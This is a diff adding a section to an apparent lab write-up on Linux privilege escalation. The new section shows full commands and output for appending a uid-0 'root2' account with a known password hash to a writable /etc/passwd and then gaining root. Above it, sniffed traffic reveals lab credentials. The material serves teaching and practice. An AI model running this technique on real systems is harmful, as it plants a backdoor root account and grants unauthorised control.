@@ -57,3 +57,18 @@ listening on lo, link-type EN10MB (Ethernet), capture size 262144 bytes
 ...{...zuser:root,pass:lab -
 ...5...5user:root,pass:lab -
 ```
+
+With write access in /etc/passwd file we can create a root user with our own password (we can even change root user password):
+
+```bash
+joe@debian-privesc:~$ openssl passwd w00t
+Fdzt.eqJQ4s0g
+
+joe@debian-privesc:~$ echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd
+
+joe@debian-privesc:~$ su root2
+Password: w00t
+
+root@debian-privesc:/home/joe# id
+uid=0(root) gid=0(root) groups=0(root)
+```
